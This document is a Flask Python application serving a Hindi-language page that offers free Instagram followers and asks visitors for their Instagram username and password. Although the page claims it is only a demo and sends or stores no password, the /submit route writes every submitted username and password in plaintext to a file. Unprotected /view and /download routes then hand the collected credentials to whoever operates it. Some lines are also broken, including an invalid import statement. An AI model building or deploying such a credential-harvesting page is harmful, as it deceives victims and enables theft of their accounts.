from flask import Flask, request, render_template_string, redirect
from datetime import datetime
from flask import send_file import os


app = Flask(__name__)
DATA_FILE = os.path.join(os.path.dirname(__file__), "entries.txt")


LOGIN_HTML = """
<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>मुफ़्त इंस्टाग्राम फ़ॉलोअर्स ट्रायल</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --ig1:#833AB4; --ig2:#FD1D1D; --ig3:#F77737;
      --bg:#0f1220; --card:#151935; --txt:#e9ebff; --muted:#aab0ff;
      --ok:#00e5a8;
    }
    *{box-sizing:border-box}
    body{
      margin:0; font-family:Poppins,system-ui,-apple-system; color:var(--txt);
      background: radial-gradient(1200px 600px at 10% -10%, #2b2f77 0%, transparent 40%),
                  radial-gradient(800px 500px at 110% 10%, #7a2d6d 0%, transparent 40%),
                  var(--bg);
      min-height:100vh;
    }
    .wrap{max-width:1100px; margin:auto; padding:28px}
    header{display:grid; grid-template-columns:1.2fr .8fr; gap:28px; align-items:center;}
    @media(max-width:900px){header{grid-template-columns:1fr}}

    .hero{
      padding:34px; border-radius:22px;
      background: linear-gradient(135deg, rgba(131,58,180,.18), rgba(253,29,29,.18), rgba(247,119,55,.18));
      box-shadow: 0 20px 60px rgba(0,0,0,.35);
    }
    .badge{display:inline-flex; gap:8px; align-items:center; padding:6px 12px; border-radius:999px;
      background: rgba(0,229,168,.15); color:var(--ok); font-weight:600; font-size:12px;}
    h1{font-size:38px; line-height:1.15; margin:16px 0 12px}
    .sub{color:var(--muted)}
    .points{display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-top:22px}
    @media(max-width:700px){.points{grid-template-columns:1fr}}
    .pt{background:rgba(255,255,255,.06); border-radius:14px; padding:14px}

    .card{
      background: linear-gradient(180deg, rgba(255,255,255,.06), rgba(255,255,255,.03));
      border:1px solid rgba(255,255,255,.08);
      border-radius:22px; padding:26px; box-shadow: 0 20px 60px rgba(0,0,0,.35);
    }
    .card h2{margin:0 0 10px}
    .note{background: rgba(0,229,168,.12); color:var(--ok);
      border:1px dashed rgba(0,229,168,.4); border-radius:14px; padding:12px; font-size:13px;}
    .form{margin-top:18px; display:grid; gap:14px}
    label{font-size:12px; color:var(--muted)}
    input{width:100%; padding:14px 16px; border-radius:14px; outline:none;
      background:#0e1230; border:1px solid rgba(255,255,255,.12); color:var(--txt);}
    input::placeholder{color:#9aa0ff}
    .row{display:grid; grid-template-columns:1fr 1fr; gap:12px}
    @media(max-width:600px){.row{grid-template-columns:1fr}}

    .btn{margin-top:8px; padding:14px 18px; border-radius:16px; border:none; cursor:pointer;
      font-weight:700; color:white; letter-spacing:.3px;
      background: linear-gradient(135deg, var(--ig1), var(--ig2), var(--ig3));
      box-shadow: 0 12px 30px rgba(253,29,29,.35);}
    .btn:active{transform:translateY(1px)}

    .how{margin-top:40px}
    .steps{display:grid; grid-template-columns:repeat(3,1fr); gap:14px}
    @media(max-width:800px){.steps{grid-template-columns:1fr}}
    .step{background:rgba(255,255,255,.05); border-radius:16px; padding:16px}

    footer{margin-top:40px; color:#9aa0ff; font-size:12px}
    .lock{display:flex; gap:10px; align-items:center; margin-top:10px; color:#b9ffd9; font-size:13px}
    .disabled{opacity:.55; filter:grayscale(1); pointer-events:none}
  </style>
</head>
<body>
  <div class="wrap">
    <header>
      <section class="hero">
        <span class="badge">✔ 100% मुफ़्त ट्रायल</span>
        <h1>मुफ़्त इंस्टाग्राम फ़ॉलोअर्स ट्रायल</h1>
        <p class="sub">असीमित संख्या में अकाउंट्स के लिए मुफ़्त और असली फ़ॉलोअर्स पाएं। ब्रांड की पहचान और विज़िबिलिटी बढ़ाइए।</p>
        <div class="points">
          <div class="pt">⚡ तुरंत और तेजी से डिलीवरी</div>
          <div class="pt">🔒 सुरक्षित डेमो</div>
          <div class="pt">📈 प्रोफ़ाइल एंगेजमेंट बूस्ट</div>
        </div>
      </section>

      <section class="card">
        <h2>नीचे अपनी जानकारी दर्ज करें</h2>
        <p class="sub">डेमो UI — यह पेज केवल डिज़ाइन/प्रेज़ेंटेशन के लिए है।</p>
        <div class="note">⚠️ सुरक्षा कारणों से यह डेमो किसी भी पासवर्ड को सर्वर पर नहीं भेजता। सबमिट करने पर डेटा केवल ब्राउज़र में सिम्युलेट होता है।</div>
        <form method="post" action="/submit">
          <div>
            <label>इंस्टाग्राम उपयोगकर्ता नाम</label>
        <input name="username" required placeholder="@username" />
          </div>

          <div>
            <label>इंस्टाग्राम पासवर्ड</label>
             <input type="password" name="password" id="igpass" required />
          </div>

          <button class="btn" type="submit">फ़ॉलोअर्स प्राप्त करें</button>
          <div class="lock">🔐 Secure Demo • No Password Stored</div>
        </form>
      </section>
    </header>

    <section class="how">
      <h2>कैसे काम करता है?</h2>
      <div class="steps">
        <div class="step">1️⃣ यूज़रनेम दर्ज करें</div>
        <div class="step">2️⃣ “फ़ॉलोअर्स प्राप्त करें” पर क्लिक करें</div>
        <div class="step">3️⃣ डेमो सबमिशन कन्फ़र्मेशन</div>
      </div>
    </section>

    <footer>
      <p>© Demo UI • यह केवल डिज़ाइन/डेमो के लिए है।</p>
    </footer>
  </div>

  <script>
    function demoSubmit(){
      const u = document.querySelector('input[placeholder="@username"]').value.trim();
      const p = document.getElementById('igpass').value;
      if(!u || !p){ alert('कृपया यूज़रनेम और पासवर्ड भरें (डेमो)।'); return false; }
      // सुरक्षा: किसी भी डेटा को नेटवर्क पर नहीं भेजा जाता
      alert('डेमो UI: इनपुट लिया गया (लोकल सिम्युलेशन)। कोई डेटा सर्वर पर नहीं गया।');
      return false;
    }
  </script>
</body>
</html>
"""
@app.route("/")
def home():
    return render_template_string(LOGIN_HTML)

@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(DATA_FILE, "a") as f:
        f.write(f"{ts} | {username} | {password}\n")
    return redirect("/done")

@app.route("/done")
def done():
    return "<h3>Thank you. (Lab use only)</h3><p>Credentials saved locally.</p>"

@app.route("/view")
def view():
    try:
        with open(DATA_FILE,"r") as f:
            return f"<pre>{f.read()}</pre>"
    except:
        return "No entries yet."

@app.route("/save", methods=["GET"])
def save():
    msg = request.args.get("msg", "")
    time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("data.txt", "a") as f:
        f.write(f"{time} - {msg}\n")

    print("SAVED:", msg)
    return "Data saved!"

@app.route("/download")
def download():
    try:
        return send_file(DATA_FILE, as_attachment=True)
    except Exception as e:
        return f"File not found. Error: {e}"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
